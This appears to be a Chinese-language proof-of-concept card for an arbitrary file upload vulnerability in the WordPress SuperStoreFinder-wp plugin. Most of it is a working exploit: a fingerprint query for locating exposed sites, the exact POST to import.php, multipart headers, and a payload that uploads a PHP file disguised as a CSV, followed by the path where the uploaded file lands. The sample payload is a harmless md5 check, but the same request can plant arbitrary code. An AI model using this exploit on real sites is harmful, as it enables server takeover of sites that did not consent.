# WordPressSuperStoreFinder-wp插件import.php任意文件上传漏洞

- **系统**：WordPress　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="wp-content/plugins/superstorefinder-wp"`
- **请求**：`POST /wp-content/plugins/superstorefinder-wp/ssf-wp-admin/pages/import.php HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=------WebKitFormBoundarybqvzqv…`

**请求体 / payload**
```
------WebKitFormBoundarybqvzqvmt
Content-Disposition: form-data; name="default_location"; filename="test.csv.php"
Content-Type: text/csv
<?php echo md5(123);unlink(__FILE__);?>
------WebKitFormBoundarybqvzqvmt

文件上传位置
/wp-content/plugins/superstorefinder-wp/ssf-wp-admin/test.csv.php
```

**其他**
- WordPress SuperStoreFinder-wp 插件 import.php 任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * WordPress SuperStoreFinder-wp